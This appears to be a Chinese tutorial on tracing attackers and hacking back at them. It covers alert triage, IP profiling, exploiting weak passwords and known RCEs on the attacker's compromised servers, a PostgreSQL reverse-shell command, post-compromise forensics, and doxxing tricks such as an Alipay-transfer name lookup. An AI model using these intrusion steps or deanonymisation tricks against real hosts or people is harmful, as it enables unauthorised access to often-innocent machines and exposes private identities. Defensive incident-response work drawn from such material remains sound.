## 0x01 第一页

Q:

什么是？

为什么要？

怎么做？

A:

一种必要的防守反击的手段。

查清攻击来源，最终目的找到攻击者。

通过信息收集和漏洞利用，收集攻击者信息，反制攻击者服务器。

**与常规应急响应中的溯源，存在区别。**

### 1.1 分析类型

当我们收到设备告警信息之后，首先要做的就是根据完整的数据包进行判断。

判断此次攻击是正常业务还是批量扫描还是针对性的攻击。

有些业务系统本身的代码逻辑有问题，会引发设备告警，比如：

![](../Images/8c52a7ab31c9960b8ec609c2e27c92a4.png)

如果攻击事件是比较离谱的，并且次数很多，可能就是扫描器了，比如：

![](../Images/586b5210fa6d8af5df2cae193efe3d23.png)

如果有明显网站特征或者是利用系统中间件或者框架漏洞的，可能就是针对性攻击了，比如：  

![](../Images/39b93cefb8b706085d2cd38a7aa74a46.png)

判断完事件类型之后，如果是正常业务，那自然皆大欢喜，如果是扫描或者针对性攻击，就要继续下一步。

![](../Images/779c8c9465873ac7f231320c9b5dde58.png)

### 1.2 收集ip信息

首先可通过威胁情报进行分析，比如：*https://x.threatbook.cn/ https://ti.360.cn/ https://ti.qianxin.com/ https://ti.dbappsecurity.com.cn/*

需要注意的是：

**同C段，不代表是同组织，尤其是vps。**

**历史解析域名，不一定是现在绑定域名。**

之后进行端口探测，主要以常见服务端口为主，比如：

`80，81，88，443，1433，1521，3306，5432，6379，8080，8081`

可利用`goby`或者`nmap`或者其他工具。

![](../Images/6963cf328ac5d3b4a15dc83c48a84bcf.png)

![](../Images/2edcf06ab0ac5be635b17fbc6ce97905.png)

综合以上信息之后，对`ip`进行判断。

**代理ip大部分为家庭宽带，肉鸡大部分为云上vps。**

**代理ip基本上无开放服务，肉鸡绝大部分存在服务端口。**

代理`ip`：本次溯源到此结束。

肉鸡`ip`：冲冲冲！

## 0x02 第二页

漏洞检测&漏洞利用

根据经验判断，凡是肉鸡，基本都是存在简单利用，一键`getshell`漏洞。

例如：

| 漏洞类型 || 端口 |
| --- | --- |
| `tomcat` 弱口令 || `8080,8081,443` |
| --- | --- |
| `redis` 未授权/弱口令 || `6379` |
| `mysql` 未授权/弱口令 || `3306` |
| `sqlserver` 未授权/弱口令 || `1433` |
| `phpmyadmin` 弱口令 || `80,443, /phpmyadmin` |
| `postgresql rce` || `5432` |
| `ThinkPHP RCE` || `80,81,88,443` |
| `shiro rce` || `80,81,88,8080,8081,443` |
| `weblogic/struts2 rce` || `80,7001,443` |

### tomcat 弱口令

利用弱口令进入`manage`页面，上传`war`进行`getshell`

### redis 未授权/弱口令

连接数据库之后，通过 (计划任务/`ssh`私钥/`webshell`)等方式`getshell`

### mysql 未授权/弱口令

登录数据库之后，写入`webshell`

### sqlserver 未授权/弱口令

登录数据库之后，可通过`xp_cmdshell`执行命令

### phpmyadmin 弱口令

弱口令登录之后，可写入`webshell`或者通过`mysql`日志文件`getshell`

### postgresql rce

空口令直接登录，通过执行`sql`语句反弹`shell`

`copy tmp from program 'bash -i >& /dev/tcp/ip/port 0>&1';`

### ThinkPHP RCE

可通过报错页面判断版本，之后搜索相应版本的`rce payload`，直接命令执行

### shiro rce

通过现有工具进行`key`的探测，之后`getshell`

### weblogic/struts2 rce

可通过现有工具进行检测

拿到服务器权限之后，就是下一步了。

## 0x03 第三页

拿到权限之后，需要尽可能多的收集攻击者遗留的信息。

可类比于现场应急响应。

下面以`linux`为例，如果肉鸡是`windows`，恭喜你中奖了。

（1）`ps -aux` 查看当前进程

检查反弹`shell`的进程(除了自己)，交互式`shell`的进程,执行脚本的进程

（2）`netstat -ano` 显示当前网络状态（端口）

检查是否存在大量对外端口扫描,是否存在访问外部`ip`的奇怪端口（`1234,2333,8888,6666,50050`）

（3）查看是否存在提权程序或脚本或文本信息

主要检查当前目录以及`/tmp`目录

（4）查看`history`历史命令

大概率没有发现

（5）查看是否存在`ssh`私钥

一般目录是`/home/xxxx/.ssh/`和`/root/.ssh/`

（6）查看是否存在计划任务

可通过`crontab -l` 命令或者查看`/var/spool/cron`和`/etc/cron.d`目录

需要排除黑产挖矿

（7）查看是否存在其他 `webshell`

主要为当前目录或者`upload`目录或者其他同级目录

（8）查看` web `日志中是否存在其他攻击记录

主要为`/var/logs`目录和`./runtime/log`目录

（9）可查看数据库中是否有反弹 shell 或者 ssh 私钥的信息

主要针对于`redis`

（10）查看数据库中是否有连接记录

主要是`postgresql`数据库，语句为：

`select client_addr,backend_start,query from pg_stat_activity;`

以上所有操作,均为了获取攻击者的服务器`ip`

或者真实`ip`,以及攻击者的详细信息（`id`，常用密码，设备信息等）。

以上信息整合后，翻到第一页，如果发现`ip`为肉鸡，请翻到第二页。

如果`ip`不是肉鸡，继续下一步。

![](../Images/46fa202a4912eda826675ea6ad3fe882.png)

## 0x04 第四页

假设我们在以上过程中，得到了攻击者的`ip`，提权`exp`，常用`id`。

（1）对于`ip`，可重复第一步

`ip`反查域名

域名查`whois`注册信息

域名查备案信息

域名反查邮箱

邮箱反查下属域名

域名反查注册人

注册人反查下属域名

（2）对于提权程序

如果生成了调试信息，没有勾选否，那么就可能会造成`PDB`信息泄露。

通过`C32`看到程序尾部的信息，找到生成木马的主机用户名。

大多数人的主机名就是自己的常用`id`。

（3）对于常用`id`

动用一切手段获取`id`其他信息

各大搜索引擎（百度,谷歌等）

各大社交平台（微信，`QQ`，`github`，微博，豆瓣，知乎，贴吧，脉脉等）

各大漏洞平台（补天，漏洞银行，教育`src`等）

小技巧：

支付宝转账

`github`反查邮箱

![](../Images/670c6335e4778096aa945ad83489c244.png)

在综合所有攻击者信息之后，可对其进行画像。之后，输出成果报告。溯源到此结束。
